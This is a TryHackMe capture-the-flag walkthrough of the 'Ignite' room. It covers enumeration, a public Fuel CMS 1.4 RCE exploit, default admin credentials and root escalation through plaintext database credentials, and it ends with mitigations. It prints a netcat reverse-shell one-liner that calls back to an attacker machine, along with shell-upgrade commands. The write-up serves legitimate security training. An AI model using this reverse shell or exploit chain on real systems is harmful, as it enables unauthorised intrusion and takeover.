# Ignite – TryHackMe

- Difficulty: easy
- Date: 2026-05-08
- Tags: web, linux, apache, fuel-cms, enumeration, gobuster, nmap, default-credentials, rce, reverse-shell, credential-disclosure, privilege-escalation

## 🧩 Overview

```text
A new start-up has a few issues with their web server.
```

## ⚙️ Tools Used

- Nmap
- Gobuster
- Netcat
- [RevShells](https://www.revshells.com/)
- Searchsploit

## Walkthrough

### Task 1 - Root it!

#### Q1: user.txt

I began with service enumeration using Nmap to identify exposed ports and running services:

```shell-session
nmap -sS -sV -O 10.113.166.102
```

<div align="center"><img src="../attachments/Pasted image 20260508093746.png"/></div>

The scan identified the following:
- The server is running **Linux 3.10 - 3.13**.
- Port 80 (**HTTP**) is open and exposed an **Apache 2.4.18** web server.

I then performed directory enumeration using `Gobuster`:

```shell-session
gobuster dir -u http://10.113.166.102/ -w /usr/share/wordlists/dirb/common.txt -r
```

The scan identified several accessible directories and endpoints.

<div align="center"><img src="../attachments/Pasted image 20260508095447.png"/></div>

Visiting the web application revealed additional information about the underlying CMS:

<div align="center"><img src="../attachments/Pasted image 20260508094244.png"/></div>

- The application is running `Fuel CMS` version `1.4`.

The webpage also provides more information like possible paths to files and permissions.

I accessed the URL `http://10.113.166.102/fire/application/config/database.php` and the server returned a **403** message.

The 403 response indicates that the file exists but direct access is restricted.

<div align="center"><img src="../attachments/Pasted image 20260508094427.png"/></div>

I've tested all the paths disclosed on the homepage and one of them
returned the `Directory access is forbidden` message but in an unusual format.

Inspecting the HTTP response in the browser developer tools showed a `200` OK status code, meaning that I was able to access that page, despite the page claiming access was forbidden.

This suggested that the `Directory access is forbidden` message was manually added to the page.

<div align="center"><img src="../attachments/Pasted image 20260508094915.png"/></div>

I kept scrolling down the page and found the default admin credentials:
- Username (`admin`)
- Password (`admin`):

<div align="center"><img src="../attachments/Pasted image 20260508095737.png"/></div>

Since default credentials are commonly overlooked during deployment, I attempted authentication using them.

I visited the webpage, tried the default credentials and successfully authenticated as `admin`.

<div align="center"><img src="../attachments/Pasted image 20260508100024.png"/></div>

Then I visited all the pages returned by `gobuster` but none of them had anything important.

Since the CMS allowed authenticated file uploads, I attempted to achieve remote code execution by uploading a PHP reverse shell.

I've copied the reverse shell located at `/usr/share/webshells/php/php-reverse-shell.php`, configured it and tried to upload it to `http://10.113.166.102/fuel/assets/`.

Unfortunately, the application enforced file extension validation and rejected executable PHP payloads.

<div align="center"><img src="../attachments/Pasted image 20260508105120.png"/></div>

Because direct file upload exploitation was unsuccessful, I searched for publicly known vulnerabilities affecting `Fuel CMS 1.4` using `searchsploit`.

<div align="center"><img src="../attachments/Pasted image 20260508105157.png"/></div>

I identified and downloaded a public remote code execution exploit targeting `Fuel CMS 1.4.1`:
- `fuel CMS 1.4.1 - Remote Code Execution (1) linux/webapps/47138.py`

I've edited the file with the target machine IP and executed it (Burp needs to be running).

<div align="center"><img src="../attachments/Pasted image 20260508105410.png"/></div>

The exploit successfully achieved remote command execution and provided a command prompt.

<div align="center"><img src="../attachments/Pasted image 20260508105459.png"/></div>

To obtain a more stable foothold, I used the RCE to execute a reverse shell payload.

I visited [revshells.com](https://www.revshells.com/) and tried the following on the target machine:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.113.121.190 31313 >/tmp/f
```

I started a listener on the attacker machine and executed the reverse shell on the target machine.

<div align="center"><img src="../attachments/Pasted image 20260508111905.png"/></div>

The payload connected back to the listener and spawned a non-interactive shell on the target system.

After confirming Python 3 was installed on the target, I upgraded the shell to a fully interactive TTY:

```shell-session
python3 -c 'import pty; pty.spawn("/bin/bash")'

CTRL + Z

stty raw -echo

fg

export TERM=xterm
```

This provided a stable interactive shell suitable for further enumeration.

<div align="center"><img src="../attachments/Pasted image 20260508112146.png"/></div>

While enumerating the compromised host, I identified the `flag.txt` in the `www-data` home directory.

<div align="center"><img src="../attachments/Pasted image 20260508113106.png"/></div>

With initial access established, the next objective is privilege escalation.

#### Q2: root.txt

The Fuel CMS homepage mentioned a database. I decided to look for configuration files to see if I could find any sensitive data stored in it.
I went back to the Fuel CMS directory and found a `database.php` file.

<div align="center"><img src="../attachments/Pasted image 20260508113445.png"/></div>

The database configuration file stored plaintext credentials, allowing privilege escalation to the `root` account.

<div align="center"><img src="../attachments/Pasted image 20260508113631.png"/></div>

Using the recovered credentials, I successfully switched to the `root` account and retrieved the final flag `root.txt`.

```
su root
```

<div align="center"><img src="../attachments/Pasted image 20260508120328.png"/></div>

## 🧠 Lessons Learned

- Enumeration often reveals version information that can be mapped to public exploits.
- Default credentials remain a common security weakness in CMS platforms.
- HTTP response codes can reveal hidden functionality even when content suggests access is denied.
- Configuration files may expose sensitive credentials useful for privilege escalation.

## 🛡️ Mitigation

- Remove or disable default CMS credentials immediately after installation.
- Restrict access to administrative panels using IP allowlists or MFA.
- Store secrets securely and avoid plaintext credentials in configuration files.
- Keep CMS software updated to patched versions.
- Disable unnecessary file upload functionality and validate uploads securely.
- Restrict web server permissions to prevent sensitive file disclosure.
